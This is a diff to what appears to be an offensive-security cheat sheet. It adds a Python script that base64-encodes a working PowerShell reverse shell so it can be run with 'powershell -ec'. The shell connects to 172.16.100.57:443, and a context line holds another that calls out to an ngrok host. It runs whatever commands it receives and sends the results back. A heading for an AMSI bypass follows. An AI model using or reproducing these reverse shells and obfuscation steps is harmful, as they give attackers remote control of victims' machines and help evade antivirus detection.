@@ -4,7 +4,22 @@ $cthulhu = New-Object System.Net.Sockets.TCPClient('0.tcp.ngrok.io',19021 );$tnt
 
 ```
 ------------------------------------------------------
+# encoder of revshell 
 
+```python
+import base64
+
+# PowerShell script
+powershell_script = '$cthulhu = New-Object System.Net.Sockets.TCPClient("172.16.100.57",443 );$tntcl = $cthulhu.GetStream();[byte[]]$cult = 0..65535|% {0};while(($i = $tntcl.Read($cult, 0, $cult.Length)) -ne 0) {;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($cult,0, $i);$ex = (iex $d 2>&1 | Out-String );$ex2 = $ex + "ASTUTE" + (pwd).Path + "> "; $shog =([text.encoding]::ASCII).GetBytes($ex2);$tntcl.write($shog,0,$shog.Length); $tntcl.Flush()};'
+
+# Encode the PowerShell script into base64
+encoded_script_bytes = powershell_script.encode('utf-16le')
+base64_encoded_script = base64.b64encode(encoded_script_bytes).decode('ascii')
+
+print(base64_encoded_script)
+```
+
+_while using `powershell -ec encoded_test`_
 # AMSI BYPASS
 
 ```php
